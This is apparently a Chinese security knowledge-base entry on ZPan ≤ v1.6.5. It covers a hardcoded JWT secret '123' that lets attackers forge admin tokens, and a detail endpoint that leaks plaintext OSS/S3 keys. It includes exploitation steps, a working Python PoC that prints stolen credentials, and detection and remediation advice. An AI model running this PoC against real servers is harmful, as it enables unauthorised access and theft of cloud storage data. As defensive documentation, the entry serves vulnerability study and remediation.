---
id: web-generic-jwt-zpan-hardcoded-secret-oss-credential-leak
title: ZPan ≤ v1.6.5 硬编码 JWT 密钥 "123" 伪造管理员，详情接口未脱敏窃取 OSS AK/SK
type: scenario
domain: web
path: web/generic/jwt
technique: hardcoded-jwt-secret-to-oss-credential-leak
affected_versions: <= v1.6.5
tags:
- go
- gin
- jwt
- hs512
- hardcoded-secret
- auth-bypass
- access-control
- information-disclosure
- oss
- s3
- cloud-credential
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T13:18:08+08:00'
  notes: 已对照原文与3张图核对；jwtutil.Init("123")、HS512伪造admin、GET /api/storages/{id}未脱敏返回AK/SK与列表SKAsterisk打码差异均一致；affected_versions已按原文设为<= v1.6.5；PoC未复跑
url: /docs/web/generic/jwt/web-generic-jwt-zpan-hardcoded-secret-oss-credential-leak/
draft: false
kb_aliases:
- ZPan 硬编码 JWT 密钥
- ZPan OSS 凭证泄漏
- zplat JWT 伪造
- /api/storages/:id 明文 secret_key
- 列表打码详情不打码
---

## 一句话结论

ZPan ≤ v1.6.5 在 `NewToken()` 中用 `jwtutil.Init("123")` 硬编码 JWT 签名密钥；攻击者用 "123" 自签 `iss=zplat`、`aud=zplatUsers`、`sub=1`、`roles=["admin"]` 的 HS512 token 即可通过认证，随后请求 `GET /api/storages/{id}`——该详情接口直接返回存储实体而没有调用列表接口使用的 `SKAsterisk()`——拿到 OSS/S3 的明文 `access_key` 与 `secret_key`，最终可直连云存储桶窃取数据。

## 原理

- **认证信任链**：服务端用同一个硬编码密钥做 JWT 签名与校验（`internal/app/service/token.go` 的 `NewToken()` 里 `jwtutil.Init("123")`）。JWT 是自包含的，服务端只要验签通过就信任其中的 `sub`（用户 ID）与 `roles`（角色）；密钥公开等价于任何人都能签发任意身份。
- **RBAC 的前置条件被绕过**：`LoginAuthWithRoles` 先 `token2Roles(c)` 解析出角色，再交给 `grbac` 按 `auth_rbac.yml` 判权。伪造 token 的 `roles=["admin"]` 直接满足 `authorized_roles: ["admin"]` 的规则，不需要知道任何真实账号口令。
- **脱敏只做在列表处理器**：`findAll` 对每条记录调用 `SKAsterisk()` 把 `SecretKey` 替换为等长星号；`find`（`GET /api/storages/:id`）直接 `ginutil.JSONData(c, ret)` 返回完整实体，没有任何脱敏或字段裁剪。同一个敏感字段在两个处理器上防护不一致，列表的“打码”只是显示层保护，不是数据层授权。
- **最终危害来自客户端直连架构**：ZPan 设计为客户端直连云存储，服务端保存的 AK/SK 就是可直接访问桶的凭据；拿到明文后攻击者不经过 ZPan 即可读写/删除桶内对象，造成数据泄漏。
- 按文中 `auth_rbac.yml`，规则 101/102 只把 `POST /api/storages` 与 `PUT/PATCH/DELETE /api/storages/**` 限定为 admin；`GET /api/storages` 与 `GET /api/storages/:id` 落到默认规则（admin/member）。原文按伪造管理员复现；若目标开放注册，普通 member 是否也能直接读详情取决于部署规则，原文未单独验证。

## 触发条件

- 目标运行 ZPan ≤ v1.6.5（原文受影响上限），HTTP 服务可达（原文示例端口 8222）。
- 目标已配置至少一个 S3 兼容存储（`/api/storages` 列表非空），且服务端保存了 AK/SK。
- 攻击者能访问 `/api/storages` 与 `/api/storages/{id}`；JWT 认证可走 `Authorization: Bearer` 或 `z-token` cookie。
- 需要 Python `jwt`（PyJWT）与 `requests` 环境来签 token 和发请求；无需真实账号。

## 利用步骤

1. 构造 JWT payload：`aud=zplatUsers`、`iss=zplat`、`sub="1"`、`roles=["admin"]`，`iat/nbf=当前时间`、`exp=当前时间+3600`，用密钥 `123` 以 HS512 签名。
2. 带 `Authorization: Bearer <token>` 请求 `GET http://<host>:8222/api/storages?offset=0&limit=20`，确认 `code=0` 并取出返回列表中的 `id`。列表中的 `secret_key` 是 `******` 形式的星号，不能用。
3. 对每个 `id` 请求 `GET http://<host>:8222/api/storages/{id}`；该接口返回完整 `data`，其中 `access_key` 与 `secret_key` 为明文（原文截图确认返回了 `bucket`、`endpoint`、`access_key`、`secret_key`）。
4. 用拿到的 `endpoint` + `bucket` + `access_key`/`secret_key` 通过 S3 客户端直连云存储，列举/下载桶内对象，完成数据窃取。

## PoC

原文提供的 Python PoC 最小化如下（仅保留核心逻辑）：

```python
import time, jwt, requests

payload = {
    "aud": "zplatUsers", "iss": "zplat", "sub": "1",
    "roles": ["admin"],
    "iat": int(time.time()), "nbf": int(time.time()),
    "exp": int(time.time()) + 3600,
}
token = jwt.encode(payload, "123", algorithm="HS512")

host = "http://TARGET:8222"
h = {"Authorization": f"Bearer {token}"}
storages = requests.get(f"{host}/api/storages", headers=h).json()["data"]["list"]
for s in storages:
    detail = requests.get(f"{host}/api/storages/{s['id']}", headers=h).json()
    print(detail["data"]["access_key"], detail["data"]["secret_key"])
```

运行方式：`python3 zpan_poc.py -u xxx:8222`（原文脚本含 `-l/--list` 仅列 ID 模式）。

## 变体与关联

- 与“示例配置硬编码 JWT SECRET_KEY”“从 Go 二进制提取硬编码 HS256 密钥”“小智 ESP32 默认 HS256 密钥”属同一原语（硬编码/默认 JWT 密钥 → 伪造 admin），差异在于本例密钥直接出现在开源仓库源码中、使用 HS512，且第二阶段有明确的“列表脱敏/详情不脱敏”不一致，最终落到 S3 凭证窃取；利用链与最终危害不同。
- 变体：若目标改过默认密钥，可尝试从公开仓库、镜像或二进制 `strings` 提取真实密钥；若详情接口被修复，仍可尝试其他返回完整实体的接口（导出、备份、共享）寻找同一字段。
- 关联：列表打码只在展示层做、序列化层未统一脱敏的接口，常见于“列表安全、详情遗漏”的成对路由；审计时应成对检查同一实体的所有读接口。
- 关联：拿到云 AK/SK 后的枚举与数据窃取可参考云 IAM/OSS 凭据滥用类卡片。

## 检测与防御

- **修复根因**：删除 `jwtutil.Init("123")`，从环境变量/密钥管理服务加载强随机密钥；密钥缺失时启动失败而不是回退默认值；支持密钥轮换并使旧 token 失效。
- **字段级授权**：在实体序列化层统一做敏感字段脱敏（如自定义 JSON marshaler 或响应 DTO），不要依赖每个 handler 手动调用 `SKAsterisk()`；`GET /api/storages/:id` 对非管理员不返回 `access_key`/`secret_key`。
- **路由-权限成对审计**：对同一资源的 list/detail/export 路由逐条核对 RBAC，避免默认规则把 GET 放宽到 member。
- **检测**：扫描源码/镜像中的 `jwtutil.Init(`、`jwt secret`、`SECRET_KEY` 等硬编码字面量；监控异常的管理员接口访问、短时间枚举 `/api/storages/{id}`、以及从非常用 IP 使用云 AK/SK 直连 OSS 的行为。
- **应急处置**：确认泄露后立即在云厂商侧禁用/轮换对应 AK/SK，审计桶访问日志与对象操作记录。
